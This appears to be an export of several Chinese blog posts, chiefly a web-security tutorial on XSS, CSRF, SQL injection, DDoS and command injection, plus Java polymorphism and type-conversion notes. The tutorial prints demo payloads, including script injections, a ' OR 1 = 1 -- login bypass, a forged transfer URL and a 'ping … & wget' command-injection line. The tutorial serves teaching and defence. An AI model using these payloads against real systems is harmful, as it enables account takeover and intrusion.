分治法分治法目前看到的解决方案有哈希分桶（Hash Buckets）和归并排序两种方案。 哈希分桶的思想是先遍历一遍，按照hash分N桶（比如1000桶），映射到不同的文件中。这样平均每个文件就10MB，然后分别处理这1000个文件，找出没有重复的即可。一个相同的数字，绝对不会夸文件，有hash做保证。 Reference 【算法】10亿int型数，统计只出现一次的数 - https://itimetraveler.github.io/2017/07/13/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%9110%E4%BA%BFint%E5%9E%8B%E6%95%B0%EF%BC%8C%E7%BB%9F%E8%AE%A1%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0/","comments":true,"categories":[{"name":"AlgorithmProblem","slug":"AlgorithmProblem","permalink":"http://swsmile.info/categories/AlgorithmProblem/"}],"tags":[{"name":"Algorithm Problem","slug":"Algorithm-Problem","permalink":"http://swsmile.info/tags/Algorithm-Problem/"}]},{"title":"【Security】Web安全","date":"2019-07-04T14:47:06.000Z","path":"2019/07/04/【Security】Web安全/","text":"XSS首先说下最常见的 XSS 漏洞，XSS (Cross Site Script)，跨站脚本攻击，因为缩写和 CSS (Cascading Style Sheets) 重叠，所以只能叫 XSS。 XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。XSS 的攻击方式千变万化，但还是可以大致细分为几种类型。 非持久型 XSS（反射型 XSS，Reflected XSS）非持久型 XSS 漏洞，也叫反射型 XSS 漏洞（Reflected XSS），一般是通过攻击者给别人发送一个带有恶意脚本代码参数的 URL，当 URL 地址被打开时，特有的恶意代码参数被 HTML 解析、执行。 演示演示项目的源文件位于[https://github.com/swsmile/XSSDemo/tree/master/Reflected XSS](https://github.com/swsmile/XSSDemo/tree/master/Reflected XSS))。 使用方式 git clone 这个项目 进入XSSDemo/Reflected XSS/ npm install 在非 Chrome 浏览器（比如使用 Firefox，因为 Chrome 默认开启了防 XSS 攻击）中打开 localhost:3000/?query=&lt;script&gt;alert(&quot;你的工商银行账户已经被锁定，请联系QQ12345&quot;)&lt;/script&gt; 页面 你会发现页面上跳出了这个警告： 如果这个 XSS 漏洞出现了工商银行的网站上，你将在访问 icbc.com.cn 的页面时突然弹出这样的提示，可见其危险性。 你可以尝试在 https://xss-game.appspot.com/level1 （存在反射性 XSS 漏洞的页面）中来主动构造一个反射性 XSS 。 持久型 XSS（存储型 XSS，Stored XSS）持久型 XSS 漏洞，也被称为存储型 XSS 漏洞（Stored XSS），一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将恶意脚本代码经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。 主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的恶意脚本代码不是来源于 URL，refferer，forms 等，而是来源于后端从数据库中读出来的数据。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。攻击成功需要同时满足以下几个条件： POST 请求提交表单后端没做转义直接入库。 后端从数据库中取出数据没做转义直接输出给前端。 前端拿到后端数据没做转义直接渲染成 DOM。 持久型 XSS 有以下几个特点： 持久性，植入在数据库中 危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡。 盗取用户敏感私密信息 演示演示项目的源文件位于https://github.com/swsmile/XSSDemo/tree/master/Stored XSS。 使用方式 git clone 这个项目； 进入XSSDemo/Stored XSS/； npm install； 在任何浏览器中打开 http://localhost:3000/login.html 登录页，并使用账户 yvette 密码 yvette 进行登录，登录后自动跳转到http://localhost:3000/comments.html ； 评论 test，一切正常； 评论 2222&lt;script&gt;alert(&quot;hack this page！！&quot;)&lt;/script&gt;； 此后，任何用户只要访问http://localhost:3000/comments.html 这个页面，就会弹出 hack this page!! 的提示。 修复而如果访问 http://localhost:3000/comments2.html ，如果评论 2222&lt;script&gt;alert(&quot;hack this page！！&quot;)&lt;/script&gt;，则不会弹出提示，因为在后端从数据库中取出数据后，进行了转义，才输出给前端。 DOM 型 XSSDOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。 例如例如 1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;DOM Based XSS Demo&lt;/title&gt;&lt;script&gt;function xsstest()&#123; var str = document.getElementById(\"input\").value; document.getElementById(\"output\").innerHTML = \"&lt;img src='\"+str+\"'&gt;&lt;/img&gt;\";&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"output\"&gt;&lt;/div&gt;&lt;input type=\"text\" id=\"input\" size=50 value=\"\" /&gt;&lt;input type=\"button\" value=\"submit\" onclick=\"xsstest()\" /&gt;&lt;/body&gt;&lt;/html&gt; 输入 x&#39; onerror=&#39;javascript:alert(/xss/) 即可触发。 演示使用方式 git clone 这个项目； 进入XSSDemo/DOM XSS/； npm install； 在任何浏览器中打开 localhost:3000/after.html； 输入评论内容: 2222&lt;script&gt;alert(1)&lt;/script&gt; 。 当然啦，如果是登录状态，还可以拿cookie等信息；还可以悄悄引入其它的.js文件过来，这样这个漏洞的利用空间就非常大了。 分析本质上，这里的问题出现在我们直接获取了客户端中的输入，并且将输入直接 append 到 HTML 中。我们简单地认为，客户端输入只包括“商品评论”，而没有考虑到还可能包含 HTML 代码。 事实上，通过DOM 型 XSS实现攻击的方式，可以是在从 querystring 中取值时，没有进行相应编码的场景，这样攻击者可以通过扩散一条具有恶意执行脚本 修复如果我们对输入的内容进行转义，这样就不会被攻击啦。 XSS的防御XSS的防御是复杂的。 HttpOnlyHttpOnly最早是由微软提出，并在IE6中实现的，至今已经逐渐成为了一个标准。浏览器将禁止页面的JS访问带有HttpOnly属性的Cookie。 其实严格地说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。HttpOnly现在已经基本支持各种浏览器，但是HttpOnly只是有助于缓解XSS攻击，但仍然需要其他能够解决XSS漏洞的方案。 输入检查在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如&lt;,&gt;等等。如果发现这些字符，则将字符过滤或者编码。这种输入检查的方式，可以叫“XSS Filter”。互联网上于很多开源的“XSS Filter”的实现。 XSS Filter在用户提交数据时获取变量，并进行XSS检查；但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。甚至有可能用户输入1&lt;3，直接会把&lt;符号给过滤掉，所以一个好的XSSFilter是比较重要的。 输出检查一般来说，除了富文本的书除外，在变量输出到HTML页面时，可以使用编码火转移的方式来防御XSS攻击。和输入检查差不多。 CSRF（跨站请求伪造攻击）CSRF（Cross-Site Request Forgery），即跨站请求伪造攻击，是一种常见的Web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。 受害者用户登录网站A，输入个人信息，在本地保存服务器生成的cookie。攻击者构建一条恶意链接，例如对受害者在网站A的信息及状态进行操作，典型的例子就是转账。受害者打开了攻击者构建的网页B，浏览器发出该恶意连接的请求，浏览器发起会话的过程中发送本地保存的cookie到网址A，A网站收到cookie，以为此链接是受害者发出的操作，导致受害者的身份被盗用，完成攻击者恶意的目的。 举个简单的例子来说明下CSRF的危害。用户登陆某银行网站，以Get请求的方式完成到另一银行的转账，如：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000。攻击者可构造另一危险链接http://www.mybank.com/Transfer.php?toUserId=100&amp;money=1000并把该链接通过一定方式发给受害者用户。受害者用户若在浏览器打开此链接，会将之前登陆后的cookie信息一起发送给银行网站，服务器在接收到该请求后，确认cookie信息无误，会完成改请求操作，造成攻击行为完成。攻击者可以构造CGI的每一个参数，伪造请求。这也是存在CSRF漏洞的最本质原因。 所以遇到 CSRF 攻击时，将对终端用户的数据和操作指令构成严重的威胁。当受攻击的终端用户具有管理员帐户的时候，CSRF 攻击将危及整个 Web 应用程序。 完成 CSRF 攻击必须要有三个条件： 用户已经登录了站点 A，并在本地记录了 cookie 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。 站点 A 没有做任何 CSRF 防御 演示偷走你的钱： 进入 CSRF 目录，运行 server.js，端口号是3001 (runcode就行) 在控制台: node server2.js，端口号3002 浏览器中访问 http://localhost:3001/，没有登录的情况下自动跳转登录页 使用 loki/loki 登录，可以看到 loki 的账号有 10W 的余额 loki 已经登录了，cookie已经有了，这个时候，有人给你发了个钓鱼网站的链接: http://localhost:3002/fish.html，你点过去了，你的钱就被偷偷偷走了~ loki 的钱在不知不觉中就被转到了 yvette 的账户 如何防御防范 CSRF 攻击可以遵循以下几种规则： Get 请求不对数据进行修改 不让第三方网站访问到用户 Cookie 阻止第三方网站请求接口 请求时附带验证信息，比如验证码或者 Token 1 SameSite可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送，可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容。 2 Referer CheckHTTP Referer是header的一部分，当浏览器向web服务器发送请求时，一般会带上Referer信息告诉服务器是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。可以通过检查请求的来源来防御CSRF攻击。正常请求的referer具有一定规律，如在提交表单的referer必定是在该页面发起的请求。所以通过检查http包头referer的值是不是这个页面，来判断是不是CSRF攻击。 但在某些情况下如从https跳转到http，浏览器处于安全考虑，不会发送referer，服务器就无法进行check了。若与该网站同域的其他网站有XSS漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。出于以上原因，无法完全依赖Referer Check作为防御CSRF的主要手段。但是可以通过Referer Check来监控CSRF攻击的发生。 3 Anti CSRF Token目前比较完善的解决方案是加入Anti-CSRF-Token。即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。 这种方法相比Referer检查要安全很多，token可以在用户登陆后产生并放于session或cookie中，然后在每次请求时服务器把token从session或cookie中拿出，与本次请求中的token 进行比对。由于token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。但在处理多个页面共存问题时，当某个页面消耗掉token后，其他页面的表单保存的还是被消耗掉的那个token，其他页面的表单提交时会出现token错误。 4 验证码应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制CSRF攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。 SQL 注入（SQL Injection）SQL 注入漏洞（SQL Injection）是 Web 开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。 而造成 SQL 注入的原因是因为程序没有有效的转义过滤用户的输入，使攻击者成功的向服务器提交恶意的 SQL 查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。 很多 Web 开发者没有意识到 SQL 查询是可以被篡改的，从而把 SQL 查询当作可信任的命令。殊不知，SQL 查询是可以绕开访问控制，从而绕过身份验证和权限检查的。更有甚者，有可能通过 SQL 查询去运行主机系统级的命令。 SQL 注入原理下面将通过一些真实的例子来详细讲解 SQL 注入的方式的原理。 考虑以下简单的管理员登录表单： 12345&lt;form action=\"/login\" method=\"POST\"&gt; &lt;p&gt;Username: &lt;input type=\"text\" name=\"username\" /&gt;&lt;/p&gt; &lt;p&gt;Password: &lt;input type=\"password\" name=\"password\" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"submit\" value=\"登陆\" /&gt;&lt;/p&gt;&lt;/form&gt; 后端的 SQL 语句可能是如下这样的： 1234567let querySQL = ` SELECT * FROM user WHERE username='$&#123;username&#125;' AND psw='$&#123;password&#125;'`;// 接下来就是执行 sql 语句... 目的就是来验证用户名和密码是不是正确，按理说乍一看上面的 SQL 语句也没什么毛病，确实是能够达到我们的目的，可是你只是站在用户会老老实实按照你的设计来输入的角度来看问题，如果有一个恶意攻击者输入的用户名是 zoumiaojiang&#39; OR 1 = 1 --，密码随意输入，就可以直接登入系统了。WFT! 冷静下来思考一下，我们之前预想的真实 SQL 语句是: 1SELECT * FROM user WHERE username='zoumiaojiang' AND psw='mypassword' 可以恶意攻击者的奇怪用户名将你的 SQL 语句变成了如下形式： 1SELECT * FROM user WHERE username='zoumiaojiang' OR 1 = 1 --' AND psw='xxxx' 在 SQL 中，-- 是注释后面的内容的意思，所以查询语句就变成了： 1SELECT * FROM user WHERE username='zoumiaojiang' OR 1 = 1 这条 SQL 语句的查询条件永远为真，所以意思就是恶意攻击者不用我的密码，就可以登录进我的账号，然后可以在里面为所欲为，然而这还只是最简单的注入，牛逼的 SQL 注入高手甚至可以通过 SQL 查询去运行主机系统级的命令，将你主机里的内容一览无余，这里我也没有这个能力讲解的太深入，毕竟不是专业研究这类攻击的，但是通过以上的例子，已经了解了 SQL 注入的原理，我们基本已经能找到防御 SQL 注入的方案了。 如何预防 SQL 注入防止 SQL 注入主要是不能允许用户输入的内容影响正常的 SQL 语句的逻辑，当用户的输入的信息将要用来拼接 SQL 语句的话，我们应该永远选择不相信，任何内容都必须进行转义过滤，当然做到这个还是不够的，下面列出防御 SQL 注入的几点注意事项： 严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害 后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。 对进入数据库的特殊字符（’，”，\\，&lt;，&gt;，&amp;，*，; 等）进行转义处理，或编码转换。基本上所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。 1mysql.query(`SELECT * FROM user WHERE username = ? AND psw = ?`, [username, psw]); 在应用发布之前建议使用专业的 SQL 注入检测工具进行检测，以及时修补被发现的 SQL 注入漏洞。网上有很多这方面的开源工具，例如 sqlmap、SQLninja 等。 避免网站打印出 SQL 错误信息，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露出来，以防止攻击者利用这些错误信息进行 SQL 注入。 不要过于细化返回的错误信息，如果目的是方便调试，就去使用后端日志，不要在接口上过多的暴露出错信息，毕竟真正的用户不关心太多的技术细节，只要话术合理就行。 碰到要操作的数据库的代码，一定要慎重，小心使得万年船，多找几个人多来几次 code review，将问题都暴露出来，而且要善于利用工具，操作数据库相关的代码属于机密，没事不要去各种论坛晒自家站点的 SQL 语句，万一被人盯上了呢？ DDoSDDoS 又叫分布式拒绝服务，全称 Distributed Denial of Service，其原理就是利用大量的请求造成资源过载，导致服务不可用，这个攻击应该不能算是安全问题，这应该算是一个另类的存在，因为这种攻击根本就是耍流氓的存在，「伤敌一千，自损八百」的行为。出于保护 Web App 不受攻击的攻防角度，还是介绍一下 DDoS 攻击吧，毕竟也是挺常见的。 DDoS 攻击可以理解为：「你开了一家店，隔壁家点看不惯，就雇了一大堆黑社会人员进你店里干坐着，也不消费，其他客人也进不来，导致你营业惨淡」。为啥说 DDoS 是个「伤敌一千，自损八百」的行为呢？毕竟隔壁店还是花了不少钱雇黑社会但是啥也没得到不是？DDoS 攻击的目的基本上就以下几个： 深仇大恨，就是要干死你 敲诈你，不给钱就干你 忽悠你，不买我防火墙服务就会有“人”继续干你 也许你的站点遭受过 DDoS 攻击，具体什么原因怎么解读见仁见智。DDos 攻击从层次上可分为网络层攻击与应用层攻击，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用。 网络层 DDoS网络层 DDos 攻击包括 SYN Flood、ACK Flood、UDP Flood、ICMP Flood 等。 SYN Flood 攻击SYN flood 攻击主要利用了 TCP 三次握手过程中的 Bug，我们都知道 TCP 三次握手过程是要建立连接的双方发送 SYN，SYN + ACK，ACK 数据包，而当攻击方随意构造源 IP 去发送 SYN 包时，服务器返回的 SYN + ACK 就不能得到应答（因为 IP 是随意构造的），此时服务器就会尝试重新发送，并且会有至少 30s 的等待时间，导致资源饱和服务不可用，此攻击属于慢型 DDoS 攻击。 ACK Flood 攻击ACK Flood 攻击是在 TCP 连接建立之后，所有的数据传输 TCP 报文都是带有 ACK 标志位的，主机在接收到一个带有 ACK 标志位的数据包的时候，需要检查该数据包所表示的连接四元组是否存在，如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包。如果在检查中发现该数据包不合法，例如该数据包所指向的目的端口在本机并未开放，则主机操作系统协议栈会回应 RST 包告诉对方此端口不存在。 UDP Flood 攻击UDP flood 攻击是由于 UDP 是一种无连接的协议，因此攻击者可以伪造大量的源 IP 地址去发送 UDP 包，此种攻击属于大流量攻击。正常应用情况下，UDP 包双向流量会基本相等，因此发起这种攻击的攻击者在消耗对方资源的时候也在消耗自己的资源。 ICMP Flood 攻击ICMP Flood 攻击属于大流量攻击，其原理就是不断发送不正常的 ICMP 包（所谓不正常就是 ICMP 包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。目前很多服务器都是禁 ping 的（在防火墙在可以屏蔽 ICMP 包），因此这种攻击方式已经落伍。 网络层 DDoS 防御网络层的 DDoS 攻击究其本质其实是无法防御的，我们能做得就是不断优化服务本身部署的网络架构，以及提升网络带宽。当然，还是做好以下几件事也是有助于缓解网络层 DDoS 攻击的冲击： 网络架构上做好优化，采用负载均衡分流。 确保服务器的系统文件是最新的版本，并及时更新系统补丁。 添加抗 DDos 设备，进行流量清洗。 限制同时打开的 SYN 半连接数目，缩短 SYN 半连接的 Timeout 时间。 限制单 IP 请求频率。 防火墙等防护设置禁止 ICMP 包等。 严格限制对外开放的服务器的向外访问。 运行端口映射程序或端口扫描程序，要认真检查特权端口和非特权端口。 关闭不必要的服务。 认真检查网络设备和主机/服务器系统的日志。只要日志出现漏洞或是时间变更,那这台机器就可能遭到了攻击。 限制在防火墙外与网络文件共享。这样会给黑客截取系统文件的机会，主机的信息暴露给黑客，无疑是给了对方入侵的机会。 加钱堆机器。。 报警。。 应用层 DDoS应用层 DDoS 攻击不是发生在网络层，是发生在 TCP 建立握手成功之后，应用程序处理请求的时候，现在很多常见的 DDoS 攻击都是应用层攻击。应用层攻击千变万化，目的就是在网络应用层耗尽你的带宽，下面列出集中典型的攻击类型。 CC 攻击当时绿盟为了防御 DDoS 攻击研发了一款叫做 Collapasar 的产品，能够有效的防御 SYN Flood 攻击。黑客为了挑衅，研发了一款 Challenge Collapasar 攻击工具（简称 CC）。 CC 攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送 CC 攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过 CC 攻击，使用爬虫对某些加载需要消耗大量资源的页面发起 HTTP 请求。 DNS FloodDNS Flood 攻击采用的方法是向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层 DNS 服务器递归查询域名信息。域名解析的过程给服务器带来了很大的负载，每秒钟域名解析请求超过一定的数量就会造成 DNS 服务器解析域名超时。 根据微软的统计数据，一台 DNS 服务器所能承受的动态域名查询的上限是每秒钟 9000 个请求。而我们知道，在一台 P3 的 PC 机上可以轻易地构造出每秒钟几万个域名解析请求，足以使一台硬件配置极高的 DNS 服务器瘫痪，由此可见 DNS 服务器的脆弱性。 HTTP 慢速连接攻击针对 HTTP 协议，先建立起 HTTP 连接，设置一个较大的 Conetnt-Length，每次只发送很少的字节，让服务器一直以为 HTTP 头部没有传输完成，这样连接一多就很快会出现连接耗尽。 流量劫持远程命令执行而远程命令执行，是用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致执行命令。 ping ___ ping www.baidu.com &amp; wget xxxxxxxxxxx 越权漏洞是比较常见的漏洞类型，越权漏洞可以理解为，一个正常的用户A通常只能够对自己的一些信息进行增删改查，但是由于程序员的一时疏忽 ，对信息进行增删改查的时候没有进行一个判断，判断所需要操作的信息是否属于对应的用户，可以导致用户A可以操作其他人的信息。 Reference 常见 Web 安全攻防总结 - https://zoumiaojiang.com/article/common-web-security/#ddos-1 Web安全学习笔记 - https://websec.readthedocs.io/zh/latest/index.html Web安全知多少 - https://wetest.qq.com/lab/view/136.html","comments":true,"categories":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/categories/Security/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/tags/Security/"}]},{"title":"【OOP】什么是多态","date":"2019-07-03T04:26:11.000Z","path":"2019/07/03/【OOP】什么是多态/","text":"什么是多态面向对象的三大特性：封装（encapsulation）、继承（Inheritance）和多态（polymophism）。从一定角度来看，封装和继承几乎都是为多态而准备的。 多态的定义：指允许不同类的对象对同一消息做出响应。即同一消息可以根据发送对象的不同而采用多种不同的行为方式。（发送消息就是函数调用）实现多态的技术称为：动态绑定（dynamic binding），是指在执行期间判断所引用对象的实际类型，根据其实际的类型调用其相应的方法。 多态的作用：消除类型之间的耦合关系。现实中，关于多态的例子不胜枚举。比方说按下 F1 键这个动作，如果当前在 Flash 界面下弹出的就是 AS 3 的帮助文档；如果当前在 Word 下弹出的就是 Word 帮助；在 Windows 下弹出的就是 Windows 帮助和支持。同一个事件发生在不同的对象上会产生不同的结果。 多态的两种表现形式多态有两种表现形式：重载和覆盖。 重载（Overload）首先说重载（overload），是发生在同一类中。与什么父类子类、继承毫无关系。 12void foo(String str);void foo(int number); 标识一个函数除了函数名外，还有函数的参数（个数和类型）。也就是说，一个类中可以有两个或更多的函数，叫同一个名字而他们的参数不同。 他们之间毫无关系，是不同的函数，只是可能他们的功能类似，所以才命名一样，增加可读性，仅此而已！ 覆盖/重写（Override）再说覆盖（Override），是发生在子类中！也就是说必须有继承的情况下才有覆盖发生。 12345678910class Parent &#123; void foo() &#123; System.out.println(\"Parent foo()\"); &#125;&#125;class Child extends Parent &#123; void foo() &#123; System.out.println(\"Child foo()\"); &#125;&#125; 我们知道继承一个类，也就有了父类了全部方法，如果你感到哪个方法不爽，功能要变，那就把那个函数在子类中重新实现一遍。 这样再调用这个方法的时候，就是执行子类中的过程了。父类中的函数就被覆盖了（当然，覆盖的时候函数名和参数要和父类中完全一样,不然你的方法对父类中的方法就不起任何作用，因为两者是两个函数，毫不关系）。 例子多态，用一句话来说，就是事物在运行过程中存在不同的状态。多态的存在有三个前提: 要有继承关系 子类要重写父类的方法 父类类型的引用指向子类 我们先定义一个父类Animal 12345678910111213141516171819class Animal&#123; int age = 20; public void eat()&#123; System.out.println(\"动物在吃饭\"); &#125; public void eat2()&#123; System.out.println(\"动物在吃饭2\"); &#125; public static void sleep()&#123; System.out.println(\"static 动物在睡觉\"); &#125; public void run()&#123; System.out.println(\"动物在奔跑\"); &#125;&#125; 再定义一个子类Cat 1234567891011121314151617181920class Cat extends Animal&#123; int age = 40; String name = \"Tom\"; public void eat()&#123; System.out.println(\"猫在吃饭\"); &#125; public void eat2()&#123; System.out.println(\"猫在吃饭2\"); &#125; public stastic void sleep()&#123; System.out.println(\"static 猫在睡觉\"); &#125; public void catchMouse()&#123; System.out.println(\"猫在抓老鼠\"); &#125;&#125; 再来一个测试 12345678910111213class Demo_Test&#123; public stastic void main(String[] args)&#123; Animal am = new Cat(); am.eat(); am.eat2(); am.sleep(); am.run(); System.out.println(am.age); //am.catchMouse(); //编译不能通过，于是注释掉了 //System.out.println(am.name); //编译不能通过，于是注释掉了 &#125;&#125; 先来看看上面是否满足三个条件： 子类Cat继承了父类Animal； 子类重写了父类的 eat()、sleep() 方法，其中前者是非静态，后者是静态方法； 在堆内存中实例化了一个子类Cat对象，并把存在于栈内存中的Animal引用类型变量指向这个对象。 运行结果12345猫在吃饭猫在吃饭2动物在睡觉动物在奔跑20 我们发现： 子类重写了父类的非静态成员方法，对应am.eat() 的输出结果是“猫在吃饭”； 子类重写了父类的非静态成员方法，且在子类重写这个非静态成员方法时，增加了@Override 关键字，对应am.eat2() 的输出结果是“猫在吃饭2”； 子类重写了父类的静态成员方法，对应 am.sleep() 的输出结果是“动物在睡觉”； 未被子类重写的方法，对应 am.run() 的输出结果是“动物在奔跑”； 子类重写了父类的成员变量，对应 am.age 的值为 20（即为在父类中的赋值）。 规律 当子类重写了父类的非静态成员方法时，通过一个父类类型的引用变量来指向一个子类对象时，调用该重写的非静态成员方法，会执行子类中的重写方法； 当子类重写了父类的静态成员方法时，通过一个父类类型的引用变量来指向一个子类对象时，调用该重写的静态成员方法，会执行父类中的重写方法； 当子类重写了父类的非静态成员方法时，加不加上 @Override 关键字并不会影响执行结果，但是加上后，编译器会帮我们检查重写方法声明的正确性； 当子类重写了父类的静态成员方法时，通过一个父类类型的引用变量来指向一个子类对象，无法调用到子类中新定义的方法和字段； 当子类重写了父类的成员变量时，通过一个父类类型的引用变量来指向一个子类对象，获取到的该成员变量的值，为该值在父类中赋的值。 多态的缺点多态也存在缺点，也就是无法尝试调用子类特有的方法，如上面被注释掉的 am.catchMouse(); System.out.println(am.name);两行代码会编译时报错，因为这是子类特有的成员方法和成员属性。 如果我们需要调用子类的特有成员方法和成员属性，那么应该将这个父类强制转换为子类类型，如 1234567891011121314151617181920class Demo_Test &#123; public static void main(String[] args) &#123; Animal am = new Cat(); am.eat(); am.sleep(); am.run();// am.catchMouse();// System.out.println(am.name); System.out.println(am.num); System.out.println(am.age); System.out.println(\"------------------------------\"); Cat ct = (Cat)am; ct.eat(); ct.sleep(); ct.run(); ct.catchMouse(); &#125; &#125; 执行强制类型转换Cat ct = (Cat)am后，这时ct就指向堆里最先创建的Cat对象了，自然能使用Cat类的一切成员方法和成员属性了。这也是多态的魅力，为了使用子类的某些方法不需要重新再开辟内存。以上就是多态中的向下转型。 Reference 什么是多态 - https://www.jianshu.com/p/2860bf584c8e Polymorphism of Java - http://frankchen.xyz/2017/01/13/Polymorphism-of-Java/","comments":true,"categories":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/categories/OOP/"}],"tags":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/tags/OOP/"}]},{"title":"【Java】基本数据类型 - 基本数据类型的类型转换","date":"2019-06-28T04:44:48.000Z","path":"2019/06/28/【Java】基本数据类型-基本数据类型的类型转换/","text":"基本数据类型 序号 数据类型 大小/位 封装类 默认值 可表示数据范围 1 byte(位) 8 Byte 0 -128 ~ 127 2 short(短整数) 16 Short 0 -32768 ~ 32767 3 int(整数) 32 Integer 0 -2147483648 ~ 2147483647 4 long(长整数) 64 Long 0L -9223372036854775808 ~ 9223372036854775807 5 float(单精度) 32 Float 0.0F 1.4E-45 ~ 3.4028235E38 6 double(双精度) 64 Double 0.0D 4.9E-324 ~ 1.7976931348623157E308 7 char(字符) 16 Character 空 0 ~ 65535 8 boolean 8 Boolean flase true或false 基本数据类型的类型转换自动类型转换自动类型转换，也称隐式类型转换，是指不需要书写代码，由系统自动完成的类型转换。由于实际开发中这样的类型转换很多，所以 Java 语言在设计时，没有为该操作设计语法，而是由 JVM 自动完成。 转换规则：从存储范围相对小的类型转换成存储范围相对大的类型。 具体规则为：byte→short(char)→int→long→float→double 也就是说 byte 类型的变量可以自动转换为 short 类型。注意，这里的“自动转换”，指的是不需要开发者显式地声明转换过程，而完全又JVM自动实现转换。 示例代码： 12byte b = 10;short sh = b; 这里在赋值时，JVM 首先将 b 的值转换为 short 类型，然后再赋值给 sh。 在类型转换时可以跳跃。示例代码： 12byte b1 = 100;int n = b1; 注意问题:在整数之间进行类型转换时，数值不发生改变，而将整数类型，特别是比较大的整数类型转换成小数类型时，由于存储方式不同，有可能存在数据精度的损失。 强制类型转换强制类型转换，也称显式类型转换，是指必须书写代码才能完成的类型转换。该类类型转换很可能存在精度的损失，所以必须书写相应的代码，并且能够忍受该种损失时才进行该类型的转换。 赋值运算的自动转换规则转换规则：从存储范围大的类型到存储范围小的类型。 具体规则为：double→float→long→int→short(char)→byte 语法格式为：(转换到的类型)需要转换的值 示例代码： 12double d = 3.10;int n = (int)d; 这里将 double 类型的变量 d 强制转换成 int 类型，然后赋值给变量 n。需要说明的是小数强制转换为整数，采用的是“去 1 法”，也就是无条件的舍弃小数点的所有数字，则以上转换出的结果是 3。整数强制转换为整数时取数字的低位，例如 int 类型的变量转换为 byte 类型时，则只去 int 类型的低 8 位（也就是最后一个字节）的值。 示例代码： 1234int n = 123;byte b = (byte)n;int m = 1234;byte b1 = (byte)m; 则 b 的值还是 123，而 b1 的值为-46。b1 的计算方法如下：m 的值转换为二进制是10011010010，取该数字低8位的值作为b1的值，则b1的二进制值是11010010，按照机器数的规定，最高位是符号位，1 代表负数，在计算机中负数存储的是补码，则该负数的原码是 10101110（11010010的补码为原值-1，即11010001，则其补码的反码为，10101110），该值就是十进制的-46。 注意问题:强制类型转换通常都会存储精度的损失，所以使用时需要谨慎。 类型提升（Type Promotion）所谓类型提升（Type Promotion），就是指在多种不同数据类型的表达式中，类型会自动向范围表示大的值的数据类型提升。 123long count = 100000000;int price = 1999;long totalPrice = price * count; price 为 int 型，count 为 long 型，运算结果为 long 型，由于将运算结果赋值给了一个long类型，因此运算结果正常，没有出现溢出的情况。 